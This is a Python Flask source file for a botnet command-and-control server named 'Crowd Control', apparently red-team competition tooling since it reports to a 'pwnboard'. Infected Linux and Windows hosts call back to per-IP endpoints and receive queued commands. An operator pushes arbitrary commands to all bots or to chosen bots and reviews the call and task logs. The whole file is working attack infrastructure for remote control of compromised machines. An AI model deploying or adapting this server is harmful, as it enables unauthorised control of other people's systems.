"""
Process POST/GET requests from clients/commander, distribute commands and keep track of bot callbacks
@author: degenerat3
"""

import datetime
import os
import requests
from flask import Flask, request



app = Flask(__name__)

all_hosts = set()

@app.route('/')
@app.route('/status')
def status():
    return "Crowd Control is running"


@app.route('/<ip>/<typ>')
@app.route('/api/callback/<ip>/<typ>')
def process_callbacks(ip, typ):
    updatePwnboard(ip, typ)
    global all_hosts
    all_hosts.add(ip)
    src = typ
    call_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if os.path.isfile("/tmp/cc/calls.log"):
        with open("/tmp/cc/calls.log", 'a') as f:
            s = "{0:<25} {1:<16} {2:<10}\n".format(call_time, ip, src)
            f.write(s)
    else:
        with open("/tmp/cc/calls.log", 'w') as f:
            s = "{0:<25} {1:<16} {2:<10}\n".format(call_time, ip, src)
            f.write(s)
    com_file = "/tmp/cc/hosts/" + ip
    if os.path.isfile(com_file):
        with open(com_file, 'r') as f:
            c = f.read()
            os.remove(com_file)
            return c + "\n"
    
    else:
        return "#lmao\n" 


@app.route('/api/windows/callback/<ip>/<typ>')
def process_win_callbacks(ip, typ):
    global all_hosts
    all_hosts.add(ip)
    src = typ
    call_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if os.path.isfile("/tmp/cc/windows/calls.log"):
        with open("/tmp/cc/windows/calls.log", 'a') as f:
            s = "{0:<25} {1:<16} {2:<10}\n".format(call_time, ip, src)
            f.write(s)
    else:
        with open("/tmp/cc/windows/calls.log", 'w') as f:
            s = "{0:<25} {1:<16} {2:<10}\n".format(call_time, ip, src)
            f.write(s)
    com_file = "/tmp/cc/windows/hosts/" + ip
    if os.path.isfile(com_file):
        with open(com_file, 'r') as f:
            c = f.read()
            os.remove(com_file)
            return c + "\n"
    else:
        return "#cls\n" 


def log_action(hosts, cmds):
    action_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_str = action_time + " : " + str(hosts) + " : " + cmds + "\n"
    with open("/tmp/cc/tasks.log", 'a') as f:
        f.write(log_str)

def log_windows_action(hosts, cmds):
    action_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_str = action_time + " : " + str(hosts) + " : " + cmds + "\n"
    with open("/tmp/cc/windows/tasks.log", 'a') as f:
        f.write(log_str)

@app.route('/api/commander/push', methods=['POST'])
def proc_inc_coms():
    content = request.json 
    host_str = content['hosts']
    coms = content['commands']
    if host_str.strip() == "all":    
        hosts = list(all_hosts)
    else:
        hosts = host_str.split('|')

    log_action(hosts, coms)
    for h in hosts:
        com_file = "/tmp/cc/hosts/" + h
        if os.path.isfile(com_file):
            with open(com_file, 'a') as f:
                f.write(coms)
        else:
            with open(com_file, 'w') as f:
                f.write(coms)
    return ""


@app.route('/api/windows/commander/push', methods=['POST'])
def proc_inc_win_coms():
    content = request.json 
    host_str = content['hosts']
    coms = content['commands']
    if host_str.strip() == "all":    
        hosts = list(all_hosts)
    else:
        hosts = host_str.split('|')

    log_action(hosts, coms)
    for h in hosts:
        com_file = "/tmp/cc/windows/hosts/" + h
        if os.path.isfile(com_file):
            with open(com_file, 'a') as f:
                f.write(coms)
        else:
            with open(com_file, 'w') as f:
                f.write(coms)
    return ""

@app.route('/api/commander/calls')
def show_call_log():
    with open("/tmp/cc/calls.log", 'r') as f:
        s = f.read()
        return s

@app.route('/api/commander/tasks')
def show_action_log():
    with open("/tmp/cc/tasks.log", 'r') as f:
        s = f.read()
        return s

@app.route('/api/windows/commander/calls')
def show_win_call_log():
    with open("/tmp/cc/windows/calls.log", 'r') as f:
        s = f.read()
        return s

@app.route('/api/windows/commander/tasks')
def show_win_action_log():
    with open("/tmp/cc/windows/tasks.log", 'r') as f:
        s = f.read()
        return s


def updatePwnboard(ip, typ):
    tstr = "CC: {}".format(typ)
    host = os.environ.get("PWNBOARD_URL", "")
    if not host:
        return
    data = {'ip': ip, 'application': tstr}
    try:
        req = requests.post(host, json=data, timeout=3)
        return True
    except Exception as E:
        print("Cannot update pwnboard: {}".format(E))
        return False



if __name__ == '__main__':
    host = os.environ.get("FLASK_HOST", "0.0.0.0")
    try:
        port = os.environ.get("FLASK_PORT", "5000")
        port = int(port)
    except ValueError:
        port = 5000
    debug = os.environ.get("FLASK_DEBUG", "False")
    debug = debug.lower().strip() in ["true", "yes", "1", "t"]
    app.run(debug=debug, host=host, port=port)


